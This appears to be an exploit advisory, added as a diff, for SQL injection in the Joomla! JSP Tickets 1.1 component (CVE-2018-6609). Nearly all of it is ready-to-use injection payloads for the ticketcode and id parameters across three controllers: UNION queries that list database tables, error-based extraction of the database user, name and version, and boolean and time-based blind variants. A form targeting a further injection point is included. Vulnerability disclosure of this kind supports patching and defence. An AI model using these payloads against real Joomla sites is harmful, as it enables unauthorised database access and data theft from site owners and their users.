@@ -1,0 +1,91 @@
+# # # # # 
+# Exploit Title: Joomla! Component JSP Tickets 1.1 - SQL Injection
+# Dork: N/A
+# Date: 04.02.2018
+# Vendor Homepage: http://joomlaserviceprovider.com/
+# Software Link: https://extensions.joomla.org/extensions/extension/clients-a-communities/help-desk/jsp-tickets/
+# Version: 1.1
+# Category: Webapps
+# Tested on: WiN7_x64/KaLiLinuX_x64
+# CVE: CVE-2018-6609
+# # # # # 
+# Exploit Author: Ihsan Sencan
+# Author Web: http://ihsan.net
+# Author Social: @ihsansencan
+# Want To Donate ? 
+# BTC : 1NGEp2eNWRCE6gp2i31UPN6G6KBzMDdCyZ
+# ETH : 0xd606c6b86a1b88c7fcc1f58f7659cfd968449cf2
+# # # # #
+# Description:
+# The vulnerability allows an attacker to inject sql commands....
+# 
+# Proof of Concept: 
+# 
+# 1)
+# http://localhost/[PATH]/index.php?option=com_jsptickets&controller=ticketlist&task=edit&ticketcode=[SQL]
+# 
+# -66' /*!07777UNION*/ /*!07777SELECT*/ nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,nUlL,/*!07777CONCAT*/((/*!07777SELECT*/+GROUP_CONCAT(table_name+SEPARATOR+0x3c62723e)+/*!07777FROM*/+INFORMATION_SCHEMA.TABLES+/*!07777WHERE*/+TABLE_SCHEMA=DATABASE())),nUlL,nUlL,nUlL,nUlL--+VerAyari
+# 
+# Parameter: ticketcode (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: option=com_jsptickets&controller=ticketlist&task=edit&ticketcode=5a71d319e86c1' AND 5298=5298 AND 'okLe'='okLe
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: option=com_jsptickets&controller=ticketlist&task=edit&ticketcode=5a71d319e86c1' AND (SELECT 8072 FROM(SELECT COUNT(*),CONCAT(0x717a6a7871,(SELECT (ELT(8072=8072,1))),0x717a706a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a) AND 'FwvD'='FwvD
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: option=com_jsptickets&controller=ticketlist&task=edit&ticketcode=5a71d319e86c1' AND SLEEP(5) AND 'Ozir'='Ozir
+# 
+#     Type: UNION query
+#     Title: Generic UNION query (NULL) - 29 columns
+#     Payload: option=com_jsptickets&controller=ticketlist&task=edit&ticketcode=-4507' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x717a6a7871,0x72476c507a64564861484f575645536355695958564f4c4e6858625061774a6b59796b6571746249,0x717a706a71),NULL,NULL,NULL,NULL-- fcOG
+
+# 2)
+# http://localhost/[PATH]/index.php?option=com_jsptickets&controller=statuslist&task=edit&id=[SQL]
+# 
+# 66 AND (SELECT 66 FROM(SELECT COUNT(*),CONCAT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(SELECT (ELT(66=66,1))),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+# 
+# 
+# Parameter: id (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: option=com_jsptickets&controller=statuslist&task=edit&id=4 AND 6325=6325
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: option=com_jsptickets&controller=statuslist&task=edit&id=4 AND (SELECT 4097 FROM(SELECT COUNT(*),CONCAT(0x71716a7a71,(SELECT (ELT(4097=4097,1))),0x717a707a71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 AND time-based blind
+#     Payload: option=com_jsptickets&controller=statuslist&task=edit&id=4 AND SLEEP(5)
+# 
+# 3)
+# http://localhost/[PATH]/index.php?option=com_jsptickets&controller=prioritylist&task=edit&id=[SQL]
+# 
+# 66 AND (SELECT 66 FROM(SELECT COUNT(*),CONCAT(CONCAT_WS(0x203a20,USER(),DATABASE(),VERSION()),(SELECT (ELT(66=66,1))),FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+# 
+# Parameter: id (GET)
+#     Type: boolean-based blind
+#     Title: AND boolean-based blind - WHERE or HAVING clause
+#     Payload: option=com_jsptickets&controller=prioritylist&task=edit&id=1 AND 9454=9454
+# 
+#     Type: error-based
+#     Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+#     Payload: option=com_jsptickets&controller=prioritylist&task=edit&id=1 AND (SELECT 1045 FROM(SELECT COUNT(*),CONCAT(0x7170716a71,(SELECT (ELT(1045=1045,1))),0x716b6a7171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+# 
+#     Type: AND/OR time-based blind
+#     Title: MySQL >= 5.0.12 OR time-based blind
+#     Payload: option=com_jsptickets&controller=prioritylist&task=edit&id=1 OR SLEEP(5)
+# 
+# 4)
+# 
+# <form method="post" action="http://localhost/[PATH]/index.php?option=com_jsptickets&controller=ticketlist&task=display">
+# <input type="text" name="jform[guestemail]"...
+# <input type="text" name="jform[ticketid]"... 
+# <input type="submit" name="searchsubmit"...
+# </form>
+# 
+# # # # #
